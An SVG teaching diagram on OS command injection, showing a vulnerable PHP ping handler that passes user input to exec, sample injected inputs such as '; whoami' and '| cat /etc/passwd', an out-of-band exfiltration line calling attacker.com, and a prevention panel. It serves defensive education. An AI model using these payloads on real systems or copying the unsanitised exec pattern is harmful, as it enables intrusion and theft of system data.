<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720">
  <!-- palette: resources/palette_diagram.yaml -->
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #f5f5f5;
        --border: #e0e0e0;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000022;
        --black: #000000;
        --primary-fill: #2196f3;
        --primary-border: #1565c0;
        --primary-text: #ffffff;
        --primary-accent: #0d47a1;
        --ok-fill: #4caf50;
        --ok-border: #2e7d32;
        --ok-text: #ffffff;
        --ok-accent: #1b5e20;
        --warn-fill: #ff9800;
        --warn-border: #e65100;
        --warn-text: #ffffff;
        --warn-accent: #bf360c;
        --danger-fill: #e74c3c;
        --danger-border: #c62828;
        --danger-text: #ffffff;
        --danger-accent: #b71c1c;
        --info-fill: #9c27b0;
        --info-border: #6a1b9a;
        --info-text: #ffffff;
        --info-accent: #4a148c;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#2196f3"/>
      <stop offset="100%" stop-color="#1565c0"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#f5f5f5"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4caf50"/>
      <stop offset="100%" stop-color="#2e7d32"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ff9800"/>
      <stop offset="100%" stop-color="#e65100"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#e74c3c"/>
      <stop offset="100%" stop-color="#c62828"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9c27b0"/>
      <stop offset="100%" stop-color="#6a1b9a"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#00000022"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#2e7d32"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#e65100"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#c62828"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#6a1b9a"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>

    <linearGradient id="grad-accent" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#1e88e5" />
      <stop offset="100%" stop-color="#1565c0" />
    </linearGradient>
    <marker id="arrow-accent" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#1565c0" />
    </marker>
  </defs>
  <rect width="1137.7778" height="640" fill="var(--bg)" rx="6"/>
  <rect x="26.6667" y="53.3333" width="186.6667" height="115.5556" rx="6" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="120" y="80" font-family="Arial,sans-serif" font-size="12.4444" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Attacker Input</text>
  <text x="44.4444" y="103.1111" font-family="monospace" font-size="10.6667" fill="var(--text-muted)">127.0.0.1; whoami</text>
  <text x="44.4444" y="120.8889" font-family="monospace" font-size="10.6667" fill="var(--text-muted)">| cat /etc/passwd</text>
  <text x="44.4444" y="138.6667" font-family="monospace" font-size="10.6667" fill="var(--text-muted)">&amp;&amp; id</text>
  <text x="44.4444" y="158.2222" font-family="monospace" font-size="10.6667" fill="var(--text-muted)">`ls -la`</text>
  <line x1="213.3333" y1="111.1111" x2="275.5556" y2="111.1111" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="244.4444" y="102.2222" font-family="Arial,sans-serif" font-size="10" fill="var(--danger-accent)" text-anchor="middle">HTTP GET/POST</text>
  <rect x="275.5556" y="44.4444" width="240" height="151.1111" rx="6" fill="var(--warn-fill)" filter="url(#shadow)" stroke="var(--warn-border)" stroke-width="2" />
  <rect x="275.5556" y="44.4444" width="240" height="32" rx="6" fill="var(--warn-fill)" stroke="var(--warn-border)" stroke-width="2"/>
  <rect x="275.5556" y="65.7778" width="240" height="10.6667" fill="var(--warn-fill)" rx="6" stroke="var(--warn-border)" stroke-width="2"/>
  <text x="395.5556" y="64.8889" font-family="Arial,sans-serif" font-size="13.3333" font-weight="bold" fill="var(--bg)" text-anchor="middle">Web Application</text>
  <text x="293.3333" y="94.2222" font-family="monospace" font-size="10" fill="var(--text-muted)">$host = $_GET['host'];</text>
  <text x="293.3333" y="110.2222" font-family="monospace" font-size="10" fill="var(--text-muted)">$cmd = "ping -c 1 " . $host;</text>
  <text x="293.3333" y="126.2222" font-family="monospace" font-size="10" fill="var(--danger-accent)">exec($cmd, $output);</text>
  <text x="293.3333" y="146.6667" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">No sanitisation!</text>
  <text x="293.3333" y="162.6667" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">Unsanitised input → shell string</text>
  <line x1="515.5556" y1="120" x2="577.7778" y2="120" stroke="var(--text-muted)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="546.6667" y="111.1111" font-family="Arial,sans-serif" font-size="10" fill="var(--text-muted)" text-anchor="middle">shell call</text>
  <rect x="577.7778" y="53.3333" width="284.4444" height="151.1111" rx="6" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
  <rect x="577.7778" y="53.3333" width="284.4444" height="32" rx="6" fill="var(--ok-accent)" />
  <rect x="577.7778" y="74.6667" width="284.4444" height="10.6667" fill="var(--ok-accent)" rx="6"/>
  <text x="720" y="73.7778" font-family="Arial,sans-serif" font-size="13.3333" font-weight="bold" fill="var(--bg)" text-anchor="middle">Shell (/bin/sh)</text>
  <text x="595.5556" y="104.8889" font-family="monospace" font-size="10.6667" fill="var(--text)">$ ping -c 1 127.0.0.1; whoami</text>
  <text x="595.5556" y="126.2222" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">Parsed as TWO commands:</text>
  <text x="595.5556" y="144" font-family="monospace" font-size="10.6667" fill="var(--ok-accent)">  ping -c 1 127.0.0.1</text>
  <text x="595.5556" y="160" font-family="monospace" font-size="10.6667" fill="var(--danger-accent)">  whoami              ← injected!</text>
  <text x="595.5556" y="192" font-family="Arial,sans-serif" font-size="10" fill="var(--text-muted)">Runs as web server user (www-data/apache)</text>
  <line x1="862.2222" y1="128.8889" x2="924.4444" y2="128.8889" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
  <text x="893.3333" y="120" font-family="Arial,sans-serif" font-size="10" fill="var(--danger-accent)" text-anchor="middle">syscall</text>
  <rect x="924.4444" y="71.1111" width="186.6667" height="97.7778" rx="6" fill="var(--danger-fill)" filter="url(#shadow)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="1017.7778" y="100.4444" font-family="Arial,sans-serif" font-size="12.4444" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">OS</text>
  <text x="1017.7778" y="120" font-family="monospace" font-size="11.5556" fill="var(--danger-accent)" text-anchor="middle">www-data</text>
  <text x="1017.7778" y="139.5556" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)" text-anchor="middle">output returned</text>
  <text x="1017.7778" y="155.5556" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)" text-anchor="middle">to attacker</text>
  <rect x="26.6667" y="222.2222" width="524.4444" height="177.7778" rx="6" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
  <text x="288.8889" y="247.1111" font-family="Arial,sans-serif" font-size="13.3333" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Shell Metacharacters Used in Injection</text>
  <rect x="44.4444" y="257.7778" width="493.3333" height="24.8889" rx="6" fill="var(--surface)" />
  <text x="71.1111" y="274.6667" font-family="monospace" font-size="11.5556" fill="var(--danger-accent)" font-weight="bold">;</text>
  <text x="102.2222" y="274.6667" font-family="Arial,sans-serif" font-size="11.5556" fill="var(--text)">Command separator — always runs next command</text>
  <rect x="44.4444" y="286.2222" width="493.3333" height="24.8889" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
  <text x="71.1111" y="303.1111" font-family="monospace" font-size="11.5556" fill="var(--danger-accent)" font-weight="bold">|</text>
  <text x="102.2222" y="303.1111" font-family="Arial,sans-serif" font-size="11.5556" fill="var(--text)">Pipe — stdout of cmd1 becomes stdin of cmd2</text>
  <rect x="44.4444" y="314.6667" width="493.3333" height="24.8889" rx="6" fill="var(--surface)" />
  <text x="71.1111" y="331.5556" font-family="monospace" font-size="11.5556" fill="var(--danger-accent)" font-weight="bold">&amp;&amp;</text>
  <text x="102.2222" y="331.5556" font-family="Arial,sans-serif" font-size="11.5556" fill="var(--text)">AND — cmd2 only if cmd1 succeeds (exit 0)</text>
  <rect x="44.4444" y="343.1111" width="493.3333" height="24.8889" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2"/>
  <text x="71.1111" y="360" font-family="monospace" font-size="11.5556" fill="var(--danger-accent)" font-weight="bold">||</text>
  <text x="102.2222" y="360" font-family="Arial,sans-serif" font-size="11.5556" fill="var(--text)">OR — cmd2 only if cmd1 fails</text>
  <rect x="44.4444" y="371.5556" width="493.3333" height="24.8889" rx="6" fill="var(--surface)" />
  <text x="71.1111" y="388.4444" font-family="monospace" font-size="11.5556" fill="var(--danger-accent)" font-weight="bold">` `  or $( )</text>
  <text x="146.6667" y="388.4444" font-family="Arial,sans-serif" font-size="11.5556" fill="var(--text)">Backticks / subshell — command substitution</text>
  <rect x="577.7778" y="222.2222" width="533.3333" height="177.7778" rx="6" fill="var(--surface)" filter="url(#shadow)" stroke="var(--border)" stroke-width="1" />
  <text x="844.4444" y="247.1111" font-family="Arial,sans-serif" font-size="13.3333" font-weight="bold" fill="var(--text)" text-anchor="middle">Blind vs Visible Injection</text>
  <rect x="595.5556" y="257.7778" width="231.1111" height="128.8889" rx="6" fill="var(--primary-fill)" stroke="var(--primary-border)" stroke-width="2" />
  <text x="711.1111" y="278.2222" font-family="Arial,sans-serif" font-size="11.5556" font-weight="bold" fill="var(--primary-accent)" text-anchor="middle">Visible (In-Band)</text>
  <text x="613.3333" y="297.7778" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">Output appears in response</text>
  <text x="613.3333" y="315.5556" font-family="monospace" font-size="10" fill="var(--text-muted)">; cat /etc/passwd</text>
  <text x="613.3333" y="333.3333" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">Response contains file content</text>
  <text x="613.3333" y="351.1111" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">Easiest to exploit</text>
  <text x="613.3333" y="368.8889" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">Confirm with: echo 1234567890</text>
  <rect x="862.2222" y="257.7778" width="231.1111" height="128.8889" rx="6" fill="var(--danger-fill)" stroke="var(--danger-border)" stroke-width="2" />
  <text x="977.7778" y="278.2222" font-family="Arial,sans-serif" font-size="11.5556" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle">Blind (Out-of-Band)</text>
  <text x="880" y="297.7778" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">No output in response</text>
  <text x="880" y="315.5556" font-family="monospace" font-size="10" fill="var(--text-muted)">; sleep 5</text>
  <text x="880" y="333.3333" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">Time-based detection</text>
  <text x="880" y="351.1111" font-family="monospace" font-size="10" fill="var(--text-muted)">; curl attacker.com/$(id)</text>
  <text x="880" y="368.8889" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">DNS/HTTP out-of-band exfil</text>
  <rect x="26.6667" y="426.6667" width="1084.4444" height="186.6667" rx="6" fill="var(--ok-fill)" filter="url(#shadow)" stroke="var(--ok-border)" stroke-width="2" />
  <text x="568.8889" y="451.5556" font-family="Arial,sans-serif" font-size="14.2222" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Prevention</text>
  <rect x="44.4444" y="462.2222" width="311.1111" height="133.3333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="200" y="482.6667" font-family="Arial,sans-serif" font-size="11.5556" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Avoid shell execution</text>
  <text x="62.2222" y="502.2222" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">• Use language APIs not shell commands</text>
  <text x="62.2222" y="520" font-family="monospace" font-size="10" fill="var(--text-muted)">subprocess.run(['ping','-c','1',host])</text>
  <text x="62.2222" y="537.7778" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">  (list form — no shell interpretation)</text>
  <text x="62.2222" y="555.5556" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">• Never pass user input to exec/system</text>
  <text x="62.2222" y="573.3333" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">• Use whitelists, not blacklists</text>
  <text x="62.2222" y="589.3333" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">• Reject inputs not matching regex pattern</text>
  <rect x="382.2222" y="462.2222" width="337.7778" height="133.3333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="551.1111" y="482.6667" font-family="Arial,sans-serif" font-size="11.5556" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Sanitise if shell is unavoidable</text>
  <text x="400" y="502.2222" font-family="monospace" font-size="10" fill="var(--text-muted)">escapeshellarg($input)   # PHP</text>
  <text x="400" y="520" font-family="monospace" font-size="10" fill="var(--text-muted)">shlex.quote(input)       # Python</text>
  <text x="400" y="537.7778" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">• Wrap input in single quotes</text>
  <text x="400" y="555.5556" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">• Escape: ; | &amp; ` $ &gt; &lt; ! \</text>
  <text x="400" y="573.3333" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text-muted)">• Drop non-alphanumeric chars</text>
  <rect x="746.6667" y="462.2222" width="346.6667" height="133.3333" rx="6" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
  <text x="920" y="482.6667" font-family="Arial,sans-serif" font-size="11.5556" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle">Defence-in-depth</text>
  <text x="764.4444" y="502.2222" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">• Run web server as low-privilege user</text>
  <text x="764.4444" y="520" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">• Use WAF rules to block metacharacters</text>
  <text x="764.4444" y="537.7778" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">• AppArmor / SELinux mandatory access</text>
  <text x="764.4444" y="555.5556" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">• Containers: restrict /bin and /usr/bin</text>
  <text x="764.4444" y="573.3333" font-family="Arial,sans-serif" font-size="10.6667" fill="var(--text)">• Log all exec() / system() calls</text>
</svg>